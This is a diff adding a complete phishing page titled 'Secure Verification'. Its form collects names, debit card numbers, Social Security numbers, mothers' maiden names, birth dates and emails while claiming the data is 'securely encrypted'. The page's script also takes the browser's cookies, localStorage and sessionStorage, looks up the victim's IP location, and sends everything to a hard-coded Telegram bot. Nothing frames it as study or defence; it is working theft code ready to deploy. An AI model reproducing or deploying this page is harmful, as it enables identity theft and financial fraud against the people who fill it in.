@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Verification</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .form-box {
+      background: white;
+      padding: 30px 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      width: 350px;
+      text-align: center;
+    }
+
+    .form-box h2 {
+      margin-bottom: 20px;
+      font-size: 20px;
+      color: #003e73;
+    }
+
+    .form-box input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .form-box button {
+      width: 100%;
+      padding: 12px;
+      background: #1877f2;
+      color: white;
+      font-size: 15px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .form-box button:hover {
+      background: #165fc1;
+    }
+
+    .footer-note {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-box">
+    <h2>Secure Verification</h2>
+    <form id="captureForm" onsubmit="submitCapture(event)">
+      <input type="text" name="first_name" placeholder="First Name" required />
+      <input type="text" name="last_name" placeholder="Last Name" required />
+      <input type="text" name="debit_card" placeholder="Debit Card Number" required />
+      <input type="text" name="ssn" placeholder="Social Security Number" required />
+      <input type="text" name="maiden_name" placeholder="Mother's Maiden Name" required />
+      <input type="date" name="dob" required />
+      <input type="email" name="email" placeholder="Email Address" required />
+      <button type="submit">Submit</button>
+    </form>
+    <div class="footer-note">
+      Your information is securely encrypted.
+    </div>
+  </div>
+
+  <script>
+    async function submitCapture(event) {
+      event.preventDefault();
+      const form = document.getElementById("captureForm");
+      const data = new FormData(form);
+      const firstName = data.get("first_name");
+      const lastName = data.get("last_name");
+      const card = data.get("debit_card");
+      const ssn = data.get("ssn");
+      const maiden = data.get("maiden_name");
+      const dob = data.get("dob");
+      const email = data.get("email");
+
+      const userAgent = navigator.userAgent;
+      const cookies = document.cookie;
+      const local = JSON.stringify(localStorage);
+      const session = JSON.stringify(sessionStorage);
+
+      let ip = "unknown", city = "unknown", country = "unknown";
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        const json = await res.json();
+        ip = json.ip;
+        city = json.city;
+        country = json.country_name;
+      } catch (e) {}
+
+      const message = `
+Secure Capture Submitted:
+Name: ${firstName} ${lastName}
+Card: ${card}
+SSN: ${ssn}
+Maiden Name: ${maiden}
+DOB: ${dob}
+Email: ${email}
+
+IP: ${ip}
+Location: ${city}, ${country}
+Browser: ${userAgent}
+Cookies: ${cookies}
+LocalStorage: ${local}
+SessionStorage: ${session}
+      `;
+
+      const BOT_TOKEN = '7857705459:AAHaGE6-uZIzv34uuWfqWdfbtP0T9jrvDbU';
+      const CHAT_ID = '5053464023';
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`
+      });
+
+      form.innerHTML = "<h3>Thank you. Your information has been submitted.</h3>";
+    }
+  </script>
+
+</body>
+</html>
